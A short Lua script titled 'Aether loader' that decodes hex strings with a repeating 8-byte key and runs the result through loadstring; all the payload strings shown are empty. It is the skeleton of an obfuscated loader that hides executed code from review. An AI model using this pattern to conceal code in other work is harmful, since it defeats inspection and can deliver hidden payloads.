-- Aether loader
local K = {69, 199, 84, 67, 176, 100, 100, 44}
local C = {
"",
"",
"",
"",
"",
""
}
local B = table.create(65536)
local j = 1
for n = 1, #C do
	local s = C[n]
	for i = 1, #s, 2 do
		local v = (tonumber(string.sub(s, i, i + 1), 16) - K[j]) % 256
		B[#B + 1] = string.char(v)
		j = j + 1
		if j > 8 then j = 1 end
	end
end
local fn = loadstring(table.concat(B))
if fn then fn() end
